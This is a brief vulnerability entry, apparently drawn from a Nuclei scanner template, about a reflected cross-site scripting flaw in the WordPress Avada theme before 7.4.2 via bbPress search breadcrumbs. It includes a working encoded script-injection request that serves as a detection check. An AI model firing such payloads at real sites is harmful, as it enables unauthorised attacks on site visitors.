# Vulnerability: WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`avada-xss.yaml`)

## Description
WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
```

